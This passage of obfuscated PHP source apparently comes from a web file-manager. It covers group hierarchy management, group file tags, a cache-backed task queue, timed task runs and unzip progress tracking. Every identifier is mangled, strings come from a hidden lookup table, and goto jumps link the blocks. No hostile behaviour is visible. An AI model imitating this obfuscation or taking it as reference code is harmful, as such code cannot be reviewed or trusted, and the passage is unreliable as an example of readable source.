$this->parentLevelArray($ÉüÀæ³»[$©ê•ç¥Å[526]]); $§ˆ¼Õ–¡ = array($½Í·Ù³‘); if (count($÷²ŠŠ“) == 0) { return $§ˆ¼Õ–¡; } if ($»º¿¸àÓ && count($÷²ŠŠ“) == 1) { return $§ˆ¼Õ–¡; } if (!$ÉüÀæ³»[$©ê•ç¥Å[470]] || !isset($ÉüÀæ³»[$©ê•ç¥Å[470]][$©ê•ç¥Å[1919]]) || $ÉüÀæ³»[$©ê•ç¥Å[470]][$©ê•ç¥Å[1919]] == $©ê•ç¥Å[1888]) { return $this->groupShowRoot($÷²ŠŠ“[count($÷²ŠŠ“) - 1], $»º¿¸àÓ); } if ($ÉüÀæ³»[$©ê•ç¥Å[470]][$©ê•ç¥Å[1919]] == $©ê•ç¥Å[365]) { $ö¨´Ï… = explode($©ê•ç¥Å[50], $ÉüÀæ³»[$©ê•ç¥Å[470]][$©ê•ç¥Å[1920]]); if ($ö¨´Ï…) { $§ˆ¼Õ–¡ = array_merge($§ˆ¼Õ–¡, $ö¨´Ï…); } } return $§ˆ¼Õ–¡; } protected function resetParentLevel() { $Ûİ¤è =& $_SERVER[¯µç›È¢]; $É±®şÒ = $Ûİ¤è[1834]; $ŠËìÜüª = $this->select(); $ŠËìÜüª = array_to_keyvalue($ŠËìÜüª, $É±®şÒ); foreach ($ŠËìÜüª as $—óì§å²) { $ÁŒ—Ÿ¿ã = $—óì§å²; $€‚·Á¸¼ = array(); while ($ÁŒ—Ÿ¿ã[$Ûİ¤è[503]] != 0) { $€‚·Á¸¼[] = $ÁŒ—Ÿ¿ã[$Ûİ¤è[503]]; $ÁŒ—Ÿ¿ã = $ŠËìÜüª[$ÁŒ—Ÿ¿ã[$Ûİ¤è[503]]]; } $€‚·Á¸¼[] = 0; $€‚·Á¸¼ = $Ûİ¤è[50] . implode($Ûİ¤è[50], array_reverse($€‚·Á¸¼)) . $Ûİ¤è[50]; $this->setNamePinyin($—óì§å²[$É±®şÒ], $—óì§å²[$Ûİ¤è[32]]); $this->where(array($É±®şÒ => $—óì§å²[$É±®şÒ]))->save(array($Ûİ¤è[592] => $€‚·Á¸¼)); } return $ŠËìÜüª; } public function groupNameAuto($œ¨Ø³Ê, $ïµâ²æ) { $ğÔºÖŞŞ =& $_SERVER[¯µç›È¢]; $¹†˜Èº¾ = $this->where(array($ğÔºÖŞŞ[407] => $œ¨Ø³Ê))->getField($ğÔºÖŞŞ[32], !0); if (!$¹†˜Èº¾ || !in_array($ïµâ²æ, $¹†˜Èº¾)) { return $ïµâ²æ; } for ($êÈÉÅü = 1; $êÈÉÅü <= count($¹†˜Èº¾) + 1; $êÈÉÅü++) { $ìÑ›¾í³ = $ïµâ²æ . "\50{$êÈÉÅü}\x29"; if (!in_array($ìÑ›¾í³, $¹†˜Èº¾)) { return $ìÑ›¾í³; } } } public function groupSwitch($ä¸ˆ»ûâ, $ûùğ¤Ø) { $¬ù¬Ä¤… =& $_SERVER[¯µç›È¢]; $¿ş˜©Š = array($¬ù¬Ä¤…[1834] => array($¬ù¬Ä¤…[7], array($ä¸ˆ»ûâ, $ûùğ¤Ø))); $®íƒÑÄ™ = $this->where($¿ş˜©Š)->select(); $®íƒÑÄ™ = array_to_keyvalue($®íƒÑÄ™, $¬ù¬Ä¤…[1834]); if (!isset($®íƒÑÄ™[$ä¸ˆ»ûâ]) || !isset($®íƒÑÄ™[$ûùğ¤Ø]) || $®íƒÑÄ™[$ä¸ˆ»ûâ][$¬ù¬Ä¤…[503]] == 0) { return !1; } $¿ş˜©Š = array($¬ù¬Ä¤…[1834] => $ä¸ˆ»ûâ); $ÌÏ¹æ = Model($¬ù¬Ä¤…[1923])->where($¿ş˜©Š)->select(); if (!$ÌÏ¹æ) { $ÌÏ¹æ = array(); } foreach ($ÌÏ¹æ as $­ŸóÛ¶¹) { $Õç•Ò = $­ŸóÛ¶¹[$¬ù¬Ä¤…[1666]]; $¿ş˜©Š = array($¬ù¬Ä¤…[1666] => $Õç•Ò, $¬ù¬Ä¤…[1834] => $ûùğ¤Ø); $ñ€»µ = Model($¬ù¬Ä¤…[1923])->where($¿ş˜©Š)->find(); if (!$ñ€»µ) { $—´“ÆÔ® = array($ûùğ¤Ø => $­ŸóÛ¶¹[$¬ù¬Ä¤…[1937]]); Model($¬ù¬Ä¤…[546])->userGroupAdd($Õç•Ò, $—´“ÆÔ®); } Model($¬ù¬Ä¤…[546])->userGroupRemove($Õç•Ò, $ä¸ˆ»ûâ); } $¿ş˜©Š = array($¬ù¬Ä¤…[417] => 2, $¬ù¬Ä¤…[503] => 0, $¬ù¬Ä¤…[416] => 1, $¬ù¬Ä¤…[510] => array($¬ù¬Ä¤…[7], array($ä¸ˆ»ûâ, $ûùğ¤Ø))); $±Şİ¸¥¤ = Model($¬ù¬Ä¤…[842])->where($¿ş˜©Š)->field($¬ù¬Ä¤…[1938])->select(); $±Şİ¸¥¤ = array_to_keyvalue($±Şİ¸¥¤, $¬ù¬Ä¤…[510], $¬ù¬Ä¤…[408]); $ÏŠÂ•«¡ = !empty($±Şİ¸¥¤[$ä¸ˆ»ûâ]) ? $±Şİ¸¥¤[$ä¸ˆ»ûâ] : !1; if ($ÏŠÂ•«¡) { if (!$±Şİ¸¥¤[$ûùğ¤Ø]) { $±Şİ¸¥¤[$ûùğ¤Ø] = Model($¬ù¬Ä¤…[842])->groupRootAdd($ûùğ¤Ø); } $œØ·£“¯ = $±Şİ¸¥¤[$ûùğ¤Ø]; $¿ş˜©Š = array($¬ù¬Ä¤…[503] => $ÏŠÂ•«¡); $±Şİ¸¥¤ = Model($¬ù¬Ä¤…[842])->where($¿ş˜©Š)->field($¬ù¬Ä¤…[1939])->select(); if (!$±Şİ¸¥¤) { $±Şİ¸¥¤ = array(); } Model($¬ù¬Ä¤…[842])->moveClearAuth = !1; foreach ($±Şİ¸¥¤ as $ô¦•µ¹º) { $¸™Œá = $ô¦•µ¹º[$¬ù¬Ä¤…[416]] == $¬ù¬Ä¤…[99] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¬ù¬Ä¤…[842])->move($ô¦•µ¹º[$¬ù¬Ä¤…[408]], $œØ·£“¯, $¸™Œá); } Model($¬ù¬Ä¤…[842])->moveClearAuth = !0; $¿ş˜©Š = array($¬ù¬Ä¤…[417] => 2, $¬ù¬Ä¤…[510] => $ä¸ˆ»ûâ); $ê˜Ô·§¯ = array($¬ù¬Ä¤…[510] => $ûùğ¤Ø); Model($¬ù¬Ä¤…[1940])->where($¿ş˜©Š)->save($ê˜Ô·§¯); Model($¬ù¬Ä¤…[1941])->where($¿ş˜©Š)->save($ê˜Ô·§¯); } $this->_changeChildLevel($®íƒÑÄ™[$ä¸ˆ»ûâ], $®íƒÑÄ™[$ûùğ¤Ø], !0); $this->where(array($¬ù¬Ä¤…[503] => $ä¸ˆ»ûâ))->save(array($¬ù¬Ä¤…[503] => $ûùğ¤Ø)); $this->_clearChildrenCache($®íƒÑÄ™[$ûùğ¤Ø]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($äÍãØ) { $ÂÚŒ©ôÄ =& $_SERVER[¯µç›È¢]; return array($ÂÚŒ©ôÄ[1942] => array($äÍãØ[0], $ÂÚŒ©ôÄ[1943]), $ÂÚŒ©ôÄ[1944] => array($äÍãØ[0], $ÂÚŒ©ôÄ[1945])); } protected function get($±Àñ¡“Û) { $†Ö”ÆåÚ =& $_SERVER[¯µç›È¢]; $àÙ‘Š  = Model($†Ö”ÆåÚ[527])->metaGet($±Àñ¡“Û, $†Ö”ÆåÚ[1946]); $å¹ıŞİİ = json_decode($àÙ‘Š , !0); return $å¹ıŞİİ ? $å¹ıŞİİ : array($†Ö”ÆåÚ[1947] => $†Ö”ÆåÚ[99], $†Ö”ÆåÚ[377] => array()); } protected function set($­Ü¤‹ı, $ïï›¤Ğ¡) { $¤¿‰º­Ê =& $_SERVER[¯µç›È¢]; $ïï›¤Ğ¡ = $ïï›¤Ğ¡ ? $ïï›¤Ğ¡ : array($¤¿‰º­Ê[1947] => $¤¿‰º­Ê[99], $¤¿‰º­Ê[377] => array()); return Model($¤¿‰º­Ê[527])->metaSet($­Ü¤‹ı, $¤¿‰º­Ê[1946], json_encode($ïï›¤Ğ¡)); } protected function getByTagID($¸”ï™¼Å, $éç¾×–­) { $™øÆ¿ÕÏ =& $_SERVER[¯µç›È¢]; if (!$¸”ï™¼Å || !$éç¾×–­) { return !1; } if (!Model($™øÆ¿ÕÏ[527])->getInfoSimple($¸”ï™¼Å)) { return !1; } $Óâš˜êâ = $this->get($¸”ï™¼Å); if (!$Óâš˜êâ || !isset($Óâš˜êâ[$™øÆ¿ÕÏ[377]])) { return !1; } $€³§æ£Ş = array_find_by_field($Óâš˜êâ[$™øÆ¿ÕÏ[377]], $™øÆ¿ÕÏ[405], $éç¾×–­); return is_array($€³§æ£Ş) ? $€³§æ£Ş : !1; } public function listSource($™ˆ·—ÆĞ, $µ•ÇùÇ¦) { $‚‹õÅ =& $_SERVER[¯µç›È¢]; if ($µ•ÇùÇ¦ && !is_array($µ•ÇùÇ¦)) { $µ•ÇùÇ¦ = array($µ•ÇùÇ¦); } $¤ªÈÙ† = $this->listData($™ˆ·—ÆĞ); $ß·í¨ê¿ = array(); foreach ($¤ªÈÙ† as $„µ¦çİ) { $˜ÓóÊùø = $„µ¦çİ[$‚‹õÅ[88]]; if (!$˜ÓóÊùø) { continue; } if (!isset($ß·í¨ê¿[$˜ÓóÊùø])) { $ß·í¨ê¿[$˜ÓóÊùø] = array(); } $ß·í¨ê¿[$˜ÓóÊùø][] = $„µ¦çİ[$‚‹õÅ[432]]; } $æ¸ªúÅ‘ = array(); foreach ($ß·í¨ê¿ as $©ÓÙıö€ => $äÃ¡õ ) { $ê¨°º’¹ = !0; if (!$µ•ÇùÇ¦) { $æ¸ªúÅ‘[] = $©ÓÙıö€; continue; } foreach ($µ•ÇùÇ¦ as $êø‚Åô¥) { if (!in_array($êø‚Åô¥, $äÃ¡õ )) { $ê¨°º’¹ = !1; break; } } if ($ê¨°º’¹) { $æ¸ªúÅ‘[] = $©ÓÙıö€; } } if (!$æ¸ªúÅ‘) { return array(); } $»úüâÙù = array($‚‹õÅ[423] => array($‚‹õÅ[424], $æ¸ªúÅ‘), $‚‹õÅ[510] => $™ˆ·—ÆĞ, $‚‹õÅ[417] => SourceModel::TYPE_GROUP); $á‚ªœÊ = Model($‚‹õÅ[1337])->listSource($»úüâÙù); if (!$á‚ªœÊ || count($æ¸ªúÅ‘) == $á‚ªœÊ[$‚‹õÅ[374]][$‚‹õÅ[375]]) { return $á‚ªœÊ; } $™÷ëÔ¾î = array(); $«´ß´Æ’ = array_to_keyvalue($á‚ªœÊ[$‚‹õÅ[87]], $‚‹õÅ[12], $‚‹õÅ[408]); $öÚ²¨ = array_to_keyvalue($á‚ªœÊ[$‚‹õÅ[86]], $‚‹õÅ[12], $‚‹õÅ[408]); $ÆÂ‚‚Ú = array_merge($öÚ²¨, $«´ß´Æ’); foreach ($æ¸ªúÅ‘ as $˜ÓóÊùø) { if (!in_array($˜ÓóÊùø, $ÆÂ‚‚Ú)) { $™÷ëÔ¾î[] = $˜ÓóÊùø; } } if ($™÷ëÔ¾î) { $this->removeBySource($™ˆ·—ÆĞ, $™÷ëÔ¾î); } return $á‚ªœÊ; } protected function listData($—ÒçË’¦) { $©è ÉÙ =& $_SERVER[¯µç›È¢]; $¿—à¯®µ = array($©è ÉÙ[1657] => 0, $©è ÉÙ[488] => array($©è ÉÙ[1948], 0), $©è ÉÙ[428] => $©è ÉÙ[1949] . $—ÒçË’¦); $Ù·†›ß = $©è ÉÙ[1950]; $Ñø¿’Šè = $this->field($Ù·†›ß)->where($¿—à¯®µ)->order($©è ÉÙ[1951])->select(); return $Ñø¿’Šè ? $Ñø¿’Šè : array(); } protected function addToTag($£å™¥åÆ, $³âÜ°ÊÕ, $óºÆ„¿¬) { $ÂŠø¤š˜ =& $_SERVER[¯µç›È¢]; if (!$this->getByTagID($£å™¥åÆ, $óºÆ„¿¬) || !$³âÜ°ÊÕ) { return !1; } if (!Model($ÂŠø¤š˜[842])->pathInfo($³âÜ°ÊÕ)) { return !1; } $†µº‡Îì = array($ÂŠø¤š˜[1657] => 0, $ÂŠø¤š˜[488] => $óºÆ„¿¬, $ÂŠø¤š˜[427] => $³âÜ°ÊÕ, $ÂŠø¤š˜[428] => $ÂŠø¤š˜[1952] . $£å™¥åÆ, $ÂŠø¤š˜[426] => $ÂŠø¤š˜[12], $ÂŠø¤š˜[1838] => 0); if ($this->where($†µº‡Îì)->find()) { return !1; } return $this->add($†µº‡Îì); } protected function removeFromTag($Ñî²¯³Ã, $©à”µï, $ˆÖ›şÈ˜) { $­ÆÈ¡¢Ì =& $_SERVER[¯µç›È¢]; if (!$this->getByTagID($Ñî²¯³Ã, $ˆÖ›şÈ˜) || !$©à”µï) { return !1; } if (is_array($©à”µï)) { $©à”µï = array($­ÆÈ¡¢Ì[7], $©à”µï); } $í›Ç‹­» = array($­ÆÈ¡¢Ì[1657] => 0, $­ÆÈ¡¢Ì[488] => $ˆÖ›şÈ˜, $­ÆÈ¡¢Ì[428] => $­ÆÈ¡¢Ì[1952] . $Ñî²¯³Ã, $­ÆÈ¡¢Ì[427] => $©à”µï); return $this->where($í›Ç‹­»)->delete(); } protected function removeByTag($Ã±Øí×, $åä¾Éöä) { $©¾Œ­È =& $_SERVER[¯µç›È¢]; if (!$this->getByTagID($Ã±Øí×, $åä¾Éöä)) { return !1; } $£×«–â– = array($©¾Œ­È[1657] => 0, $©¾Œ­È[488] => $åä¾Éöä, $©¾Œ­È[428] => $©¾Œ­È[1952] . $Ã±Øí×); return $this->where($£×«–â–)->delete(); } protected function removeBySource($ÍÀ“Ïëò, $“ìöĞ¼») { $Â®Ë¤Ö =& $_SERVER[¯µç›È¢]; if (!$ÍÀ“Ïëò || !$“ìöĞ¼») { return !1; } if (is_array($“ìöĞ¼»)) { $“ìöĞ¼» = array($Â®Ë¤Ö[7], $“ìöĞ¼»); } $Ö³½™ºç = array($Â®Ë¤Ö[1657] => 0, $Â®Ë¤Ö[427] => $“ìöĞ¼», $Â®Ë¤Ö[488] => array($Â®Ë¤Ö[1026], 0), $Â®Ë¤Ö[428] => $Â®Ë¤Ö[1952] . $ÍÀ“Ïëò); return $this->where($Ö³½™ºç)->delete(); } } goto BìÁ§¦‰ïª; cÂäÇó”‘Ë: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\121\x75\145\165\145\x4c\145\x6e\x67\164\x68"; const QUEUE_DATA = "\x74\141\x73\153\x51\x75\x65\x75\x65\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($ªšŠù¼Ğ, $ãñ…»şé = array(), $°›Â ë = '', $µÉüÖ·Ù = '') { $­ùÓÊ’ò =& $_SERVER[¯µç›È¢]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($µÉüÖ·Ù && array_find_by_field(self::$listData, $­ùÓÊ’ò[105], $µÉüÖ·Ù)) { return !0; } self::$listData[] = array($­ùÓÊ’ò[272] => $ªšŠù¼Ğ, $­ùÓÊ’ò[1743] => $ãñ…»şé, $­ùÓÊ’ò[456] => $°›Â ë, $­ùÓÊ’ò[105] => $µÉüÖ·Ù); return !0; } public static function addSubmit() { $ëåŸ¤äÆ =& $_SERVER[¯µç›È¢]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ëåŸ¤äÆ[1744] . json_encode_force(array_to_keyvalue(self::$listData, $ëåŸ¤äÆ[12], $ëåŸ¤äÆ[456])), $ëåŸ¤äÆ[1745]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ê¥÷õÓÈ, $ìæçÒ¾¼ = array(), $ë‡íö²à = '', $˜÷°ë‘ = '') { $ˆŒ®­³– =& $_SERVER[¯µç›È¢]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Šß•æä” = self::getAll(); if ($˜÷°ë‘ && array_find_by_field($Šß•æä”, $ˆŒ®­³–[105], $˜÷°ë‘)) { return !0; } $Šß•æä”[] = array($ˆŒ®­³–[272] => $ê¥÷õÓÈ, $ˆŒ®­³–[1743] => $ìæçÒ¾¼, $ˆŒ®­³–[456] => $ë‡íö²à, $ˆŒ®­³–[105] => $˜÷°ë‘); write_log($ˆŒ®­³–[1744] . $ë‡íö²à, $ˆŒ®­³–[1745]); self::setAll($Šß•æä”); return !0; } public static function run() { $ÏƒÆ½ë‹ =& $_SERVER[¯µç›È¢]; $…¤šÊ© = self::getAll(); $ò¸¨¬÷” = array_shift($…¤šÊ©); if (!$ò¸¨¬÷”) { return !1; } self::setAll($…¤šÊ©); $»•½ï¾ = timeFloat(); try { Hook::apply($ò¸¨¬÷”[$ÏƒÆ½ë‹[272]], $ò¸¨¬÷”[$ÏƒÆ½ë‹[1743]]); } catch (Exception $Èó¹å¿§) { } $ä ÑĞíÌ = number_format(timeFloat() - $»•½ï¾, 3) . $ÏƒÆ½ë‹[1682]; write_log($ÏƒÆ½ë‹[1746] . $ò¸¨¬÷”[$ÏƒÆ½ë‹[456]] . $ÏƒÆ½ë‹[1747] . $ä ÑĞíÌ, $ÏƒÆ½ë‹[1745]); return !0; } public static function count() { $÷§²ø¹ˆ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$÷§²ø¹ˆ) { return 0; } return intval($÷§²ø¹ˆ); } public static function getAll() { $æ®‰Ôò = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$æ®‰Ôò) { return array(); } return $æ®‰Ôò; } public static function setAll($Ñıïä¼Æ) { $¨äÇ·Èê = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ñıïä¼Æ), $¨äÇ·Èê); Cache::set(self::QUEUE_DATA, $Ñıïä¼Æ, $¨äÇ·Èê); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($©¹Áûéƒ, $çè¯€ğÒ = 5.0) { if (!$©¹Áûéƒ) { return; } $Û“Şİ¨‚ = Cache::get($©¹Áûéƒ); if (!$Û“Şİ¨‚ || timeFloat() - floatVal($Û“Şİ¨‚) >= $çè¯€ğÒ) { Cache::set($©¹Áûéƒ, timeFloat(), $çè¯€ğÒ * 10); return !0; } return !1; } public static function timeLimitCall($¶í¿ší´, $¼î²÷×û, $ŒâÖ©èá, $Ô³å éî = 5.0) { $Éèï»Ù =& $_SERVER[¯µç›È¢]; if (!$¶í¿ší´ || !$¼î²÷×û) { return; } self::$asyncAdd = !0; $æ¾¸ìßâ = $Éèï»Ù[1748]; $¶äáı¤ = Cache::get($æ¾¸ìßâ, !0); $Õ¢œ’“ = array($Éèï»Ù[1749] => timeFloat(), $Éèï»Ù[1750] => timeFloat(), $Éèï»Ù[272] => $¼î²÷×û, $Éèï»Ù[1743] => $ŒâÖ©èá, $Éèï»Ù[210] => $Ô³å éî); if (is_array($¶äáı¤[$¶í¿ší´])) { $Õ¢œ’“[$Éèï»Ù[1750]] = $¶äáı¤[$¶í¿ší´][$Éèï»Ù[1750]]; } if (is_array($¶äáı¤[$¶í¿ší´])) { if (timeFloat() - $¶äáı¤[$¶í¿ší´][$Éèï»Ù[1749]] < $Õ¢œ’“[$Éèï»Ù[210]] * 0.3) { return; } $Õ¢œ’“[$Éèï»Ù[1750]] = $¶äáı¤[$¶í¿ší´][$Éèï»Ù[1750]]; } $¶äáı¤[$¶í¿ší´] = $Õ¢œ’“; Cache::set($æ¾¸ìßâ, $¶äáı¤, 60); Cache::removeMemory($æ¾¸ìßâ); write_log($Éèï»Ù[1751] . $¶í¿ší´ . $Éèï»Ù[81] . $¼î²÷×û, $Éèï»Ù[1745]); } public static function timeLimitCallLoop() { $¡™Ğ‰ˆş =& $_SERVER[¯µç›È¢]; $İËÒ ‡é = array($¡™Ğ‰ˆş[1752]); $Ù‹Ã¤ì¥ = in_array(strtolower(ACTION), $İËÒ ‡é); if (!$Ù‹Ã¤ì¥ && !self::$asyncAdd) { return; } $ŠîÉ½‘ = $¡™Ğ‰ˆş[1748]; $µøÆ·Œ = Cache::get($ŠîÉ½‘, !0); if (!$µøÆ·Œ || count($µøÆ·Œ) <= 0) { return; } $‹ĞÚÔï— = !1; $Ï í Ú› = timeFloat(); $¿Û¬ÔïÎ = array(); foreach ($µøÆ·Œ as $ßâ£îÎ => $å±£ôı) { if ($Ï í Ú› - $å±£ôı[$¡™Ğ‰ˆş[1750]] > $å±£ôı[$¡™Ğ‰ˆş[210]]) { $‹ĞÚÔï— = !0; try { Hook::apply($å±£ôı[$¡™Ğ‰ˆş[272]], $å±£ôı[$¡™Ğ‰ˆş[1743]]); write_log($¡™Ğ‰ˆş[1753] . $ßâ£îÎ . $¡™Ğ‰ˆş[81] . $å±£ôı[$¡™Ğ‰ˆş[272]] . $¡™Ğ‰ˆş[1754] . ACTION, $¡™Ğ‰ˆş[1745]); } catch (Exception $±°Ü­–ç) { } continue; } $¿Û¬ÔïÎ[$ßâ£îÎ] = $å±£ôı; } if (!$‹ĞÚÔï—) { return; } if (!$¿Û¬ÔïÎ) { return Cache::remove($ŠîÉ½‘); } Cache::set($ŠîÉ½‘, $¿Û¬ÔïÎ, 60); Cache::removeMemory($ŠîÉ½‘); } public static function finished($í«éˆµµ, $ñİİĞü) { $È†¢‡€ =& $_SERVER[¯µç›È¢]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($È†¢‡€[272] => $í«éˆµµ, $È†¢‡€[1743] => $ñİİĞü); } private static function finishedRun() { $ÈÎÖ§÷ =& $_SERVER[¯µç›È¢]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¦ø¦ÜøÑ) { try { Hook::apply($¦ø¦ÜøÑ[$ÈÎÖ§÷[272]], $¦ø¦ÜøÑ[$ÈÎÖ§÷[1743]]); } catch (Exception $ÁÂÚ£¢È) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Ã‰Š‰œË =& $_SERVER[¯µç›È¢]; parent::startAfter(); Hook::bind($Ã‰Š‰œË[1755], array($this, $Ã‰Š‰œË[1756])); Hook::bind($Ã‰Š‰œË[1204], array($this, $Ã‰Š‰œË[1757])); $Çàµéú’ =& $this->task; $Çàµéú’[$Ã‰Š‰œË[1758]] = $Ã‰Š‰œË[1209]; if (!$Çàµéú’[$Ã‰Š‰œË[1566]]) { $Çàµéú’[$Ã‰Š‰œË[1566]] = LNG($Ã‰Š‰œË[1759]); } } protected function endAfter() { $ëƒ ©Š± =& $_SERVER[¯µç›È¢]; parent::endAfter(); Hook::unbind($ëƒ ©Š±[1755], array($this, $ëƒ ©Š±[1756])); Hook::unbind($ëƒ ©Š±[1204], array($this, $ëƒ ©Š±[1757])); } public function updateAfter() { $ØÑ±¶õ¨ =& $_SERVER[¯µç›È¢]; $­¸ì„Ÿå =& $this->task; if (!$­¸ì„Ÿå[$ØÑ±¶õ¨[803]] || !$­¸ì„Ÿå[$ØÑ±¶õ¨[780]]) { return; } if ($­¸ì„Ÿå[$ØÑ±¶õ¨[1758]] == $ØÑ±¶õ¨[1209]) { $ßÄßëô = 0; if ($­¸ì„Ÿå[$ØÑ±¶õ¨[1714]]) { $ßÄßëô = $­¸ì„Ÿå[$ØÑ±¶õ¨[1715]] / $­¸ì„Ÿå[$ØÑ±¶õ¨[1714]]; } $­¸ì„Ÿå[$ØÑ±¶õ¨[1668]] = $ßÄßëô * 0.3; } else { if ($­¸ì„Ÿå[$ØÑ±¶õ¨[1758]] == $ØÑ±¶õ¨[321]) { $ßÄßëô = $­¸ì„Ÿå[$ØÑ±¶õ¨[1667]] / $­¸ì„Ÿå[$ØÑ±¶õ¨[803]]; $­¸ì„Ÿå[$ØÑ±¶õ¨[1668]] = 0.3 + $ßÄßëô * 0.4; } else { if ($­¸ì„Ÿå[$ØÑ±¶õ¨[1758]] == $ØÑ±¶õ¨[118]) { $¹î¨¦…« = 0; if ($­¸ì„Ÿå[$ØÑ±¶õ¨[1716]] == $ØÑ±¶õ¨[118]) { $¹î¨¦…« = $­¸ì„Ÿå[$ØÑ±¶õ¨[1715]]; } $ßÄßëô = ($­¸ì„Ÿå[$ØÑ±¶õ¨[1719]] + $¹î¨¦…«) / $­¸ì„Ÿå[$ØÑ±¶õ¨[780]]; $­¸ì„Ÿå[$ØÑ±¶õ¨[1668]] = 0.3 + 0.4 + $ßÄßëô * 0.3; } } } if ($­¸ì„Ÿå[$ØÑ±¶õ¨[1668]] > 0) { $¥ÛôãÀ = timeFloat() - $­¸ì„Ÿå[$ØÑ±¶õ¨[1670]] - $­¸ì„Ÿå[$ØÑ±¶õ¨[1673]]; $­¸ì„Ÿå[$ØÑ±¶õ¨[1674]] = $¥ÛôãÀ * (1 - $­¸ì„Ÿå[$ØÑ±¶õ¨[1668]]) / $­¸ì„Ÿå[$ØÑ±¶õ¨[1668]]; } } public function addFile($ØÎ²·ª×) { $×İÀığÒ =& $_SERVER[¯µç›È¢]; $„±èï°Ğ =& $this->task; $ªƒÇÏ‰‰ = IO::info($ØÎ²·ª×); $„±èï°Ğ[$×İÀığÒ[1712]] = $ªƒÇÏ‰‰[$×İÀığÒ[32]]; $„±èï°Ğ[$×İÀığÒ[1714]] = $ªƒÇÏ‰‰[$×İÀığÒ[90]]; $„±èï°Ğ[$×İÀığÒ[1715]] = 0; $„±èï°Ğ[$×İÀığÒ[1076]] = $×İÀığÒ[1734]; $„±èï°Ğ[$×İÀığÒ[1716]] = $×İÀığÒ[1209]; $„±èï°Ğ[$×İÀığÒ[780]] = $ªƒÇÏ‰‰[$×İÀığÒ[90]]; $„±èï°Ğ[$×İÀığÒ[803]] = 1; $ëÄ¬ĞªÕ = 0; $„±èï°Ğ[$×İÀığÒ[1723]] = array($×İÀığÒ[1724] => $ëÄ¬ĞªÕ + 1, $×İÀığÒ[426] => $ªƒÇÏ‰‰[$×İÀığÒ[32]], $×İÀığÒ[88] => $ªƒÇÏ‰‰[$×İÀığÒ[88]], $×İÀığÒ[524] => $ªƒÇÏ‰‰[$×İÀığÒ[524]] ? $ªƒÇÏ‰‰[$×İÀığÒ[524]] : $ªƒÇÏ‰‰[$×İÀığÒ[88]]); $this->update(); } public function unzipAfter($‹õÔáÂø) { $­­øÜ˜ä =& $_SERVER[¯µç›È¢]; $º™“—Ô… =& $this->task; $º™“—Ô…[$­­øÜ˜ä[1758]] = $­­øÜ˜ä[118]; $è³šæã´ = IO::infoWithChildren($‹õÔáÂø); $Œ¥¹ã’œ = 0; $º™“—Ô…[$­­øÜ˜ä[1723]] = array($­­øÜ˜ä[1724] => $Œ¥¹ã’œ + 1, $­­øÜ˜ä[426] => $è³šæã´[$­­øÜ˜ä[32]], $­­øÜ˜ä[88] => $è³šæã´[$­­øÜ˜ä[88]], $­­øÜ˜ä[524] => $è³šæã´[$­­øÜ˜ä[524]] ? $è³šæã´[$­­øÜ˜ä[524]] : $è³šæã´[$­­øÜ˜ä[88]]); if ($è³šæã´[$­­øÜ˜ä[33]] == $­­øÜ˜ä[206]) { $º™“—Ô…[$­­øÜ˜ä[803]] = 1; } else { $º™“—Ô…[$­­øÜ˜ä[803]] = $è³šæã´[$­­øÜ˜ä[93]][$­­øÜ˜ä[91]]; } $º™“—Ô…[$­­øÜ˜ä[1076]] = $­­øÜ˜ä[12]; $º™“—Ô…[$­­øÜ˜ä[1716]] = 0; $º™“—Ô…[$­­øÜ˜ä[1667]] = 0; $º™“—Ô…[$­­øÜ˜ä[1714]] = 0; $º™“—Ô…[$­­øÜ˜ä[1715]] = 0; $º™“—Ô…[$­­øÜ˜ä[1712]] = $­­øÜ˜ä[12]; $º™“—Ô…[$­­øÜ˜ä[1719]] = 0; $º™“—Ô…[$­­øÜ˜ä[780]] = $è³šæã´[$­­øÜ˜ä[90]]; $this->update(); self::log($­­øÜ˜ä[1760] . json_encode(array($º™“—Ô…, $è³šæã´))); } public function nameParse($Òßôïï) { $È’ÓûİÛ =& $_SERVER[¯µç›È¢]; $ñ¥üâĞÎ =& $this->task; if ($ñ¥üâĞÎ[$È’ÓûİÛ[1758]] == $È’ÓûİÛ[1209]) { $ñ¥üâĞÎ[$È’ÓûİÛ[1758]] = $È’ÓûİÛ[321]; $ñ¥üâĞÎ[$È’ÓûİÛ[1719]] = 0; $ñ¥üâĞÎ[$È’ÓûİÛ[780]] = 0; } $æáşæî« = get_path_this($Òßôïï); if (strstr($æáşæî«, $È’ÓûİÛ[10])) { $ñ¥üâĞÎ[$È’ÓûİÛ[1667]] += 1; $ñ¥üâĞÎ[$È’ÓûİÛ[803]] += 1; } $ñ¥üâĞÎ[$È’ÓûİÛ[1712]] = $Òßôïï; $this->update(); } } goto aİ¶—Ÿ˜‰Ç; d§±Í†º: class KodIO { const KOD_SOURCE = "\173\163\157\165\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\x52\x65\143\x79\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\163\x65\162\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\x72\106\151\154\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\162\x46\x69\154\x65\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\165\x70\122\157\x6f\164\x53\145\x6c\146\175"; const KOD_USER_SHARE = 